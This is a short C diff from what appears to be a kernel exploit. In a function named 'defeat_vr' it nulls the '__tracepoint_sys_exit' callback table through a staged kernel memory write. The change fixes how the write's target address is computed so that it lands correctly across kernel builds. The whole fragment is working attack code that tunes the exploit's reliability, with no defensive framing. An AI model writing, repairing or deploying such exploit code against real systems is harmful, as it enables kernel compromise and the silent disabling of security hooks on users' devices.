@@ -1472,17 +1472,12 @@ static int defeat_vr(unsigned long long task, unsigned char *raw)
         }
         logf("[+] vr: nulling __tracepoint_sys_exit.funcs at %#llx\n",
              tp + TP_FUNCS_OFF);
-        if (g_tp_runtime)
-        {
-            g_rel_mode = 2;
-            g_rel_abs = tp + TP_FUNCS_OFF;
-        }
-        else
-        {
-            g_rel_mode = 1;
-            g_rel_static = TP_STATIC;
-            g_rel_off = TP_FUNCS_OFF;
-        }
+        /* Always write the absolute address computed above.  A relative
+         * target here silently kept TP_STATIC (the profile's) for the
+         * per-build-table path, aiming the write at the wrong address on
+         * every build whose profile does not match. */
+        g_rel_mode = 2;
+        g_rel_abs = tp + TP_FUNCS_OFF;
     }
     if (stage_write_retry(0, 0, "vr_sys_exit_funcs", raw, 3, NULL))
     {
